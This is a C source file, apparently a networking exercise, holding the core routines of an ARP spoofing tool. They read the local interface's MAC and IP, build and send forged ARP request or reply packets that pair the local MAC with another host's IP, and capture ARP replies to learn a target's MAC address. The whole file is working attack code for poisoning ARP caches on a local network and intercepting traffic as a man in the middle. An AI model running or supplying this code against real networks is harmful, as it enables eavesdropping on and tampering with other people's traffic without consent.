#include "arp_spoof.h"

void usage(){
	printf("syntax: arp_spoof <interface> <sender_ip> <receiver_ip> ...  \n");
}

void get_my_dev(u_int8_t *ether, u_int8_t *ip, char *dev){
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	if(fd<0) perror("socket fail");
	strcpy(ifr.ifr_name, "ens33");
	if(ioctl(fd, SIOCGIFHWADDR, &ifr)<0) perror("ioctl fail");  // get MAC address
	memcpy(ether, ifr.ifr_hwaddr.sa_data, 6);
	if(ioctl(fd,SIOCGIFADDR, &ifr)<0) perror("ioctl fail");  // get IP address
	memcpy(ip,&(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4*sizeof(*ip));
}

void send_arp(pcap_t *handle, u_int8_t *ether_dhost, u_int8_t *target_mac, u_int8_t *target_ip, u_int8_t *source_ip, u_int8_t *my_mac , int type){
	u_char packet[50];

	struct arp_packet *arp_p = (struct arp_packet *)packet;

	memcpy(arp_p->ether_dhost, ether_dhost, 6);
	memcpy(arp_p->ether_shost, my_mac, 6);
	arp_p->ether_type = htons(ETHERTYPE_ARP);

	arp_p->ar_hrd = htons(ARPHRD_ETHER);
	arp_p->ar_pro = htons(ETHERTYPE_IP);
	arp_p->ar_hln = 0x06;
	arp_p->ar_pln = 0x04;
	if (type == 1) arp_p->ar_op = htons(ARPOP_REQUEST);
	else arp_p->ar_op = htons(ARPOP_REPLY);

	memcpy(arp_p->arp_sha, my_mac, 6);
	memcpy(arp_p->arp_spa, source_ip, 4);
	memcpy(arp_p->arp_tha, target_mac, 6);
	memcpy(arp_p->arp_tpa, target_ip, 4);
	
	pcap_sendpacket(handle, (u_char*)packet, 42);
}

void get_the_mac(pcap_t *handle, u_int8_t *target_ip, u_int8_t *mac_to_know){
	while(1){
		struct pcap_pkthdr* header;
		const u_char* packet;

		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0 || res == -1 || res == -2) continue;

		struct arp_packet *tmp_p = (struct arp_packet *)packet;

		if (ntohs(tmp_p->ether_type) != ETHERTYPE_ARP) continue;
		if (ntohs(tmp_p->ar_op) != ARPOP_REPLY) continue;
		
		memcpy(mac_to_know, tmp_p->ether_shost, 6);
		break;
	}
}
